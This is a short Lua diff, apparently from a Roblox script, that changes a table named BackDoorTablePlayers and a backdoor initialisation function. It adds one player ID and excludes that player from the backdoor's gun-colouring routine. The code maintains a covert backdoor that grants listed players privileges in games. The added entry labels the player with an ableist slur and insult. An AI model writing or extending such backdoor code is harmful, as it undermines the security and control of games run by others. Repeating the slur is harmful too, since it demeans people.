@@ -286,6 +286,11 @@ local BackDoorTablePlayers = {
 		['Access'] = 2;
 		['Colour'] = Color3.fromRGB(255,0,255);
 	};
+	[567153118] = {
+		['Name'] = "fucking retard who wont stfu";
+		['Access'] = 0;
+		['Colour'] = Color3.fromRGB(76,68,45);
+	};
 }
 
 local BlacklistTable = {
@@ -598,7 +603,7 @@ local function ColourifyGuns(GunTable,Colour)
 end
 
 local function initalizeBackdoorPart2(BackdoorPlayer,Colour)
-	if BackdoorPlayer and BackdoorPlayer.Character then
+	if BackdoorPlayer and BackdoorPlayer.Character and BackdoorPlayer.UserId ~= 567153118 then
 		ColourifyGuns(BackdoorPlayer.Backpack,Colour)
 		ColourifyGuns(BackdoorPlayer.Character,Colour)
 		BackdoorPlayer.Character.ChildAdded:Connect(function()
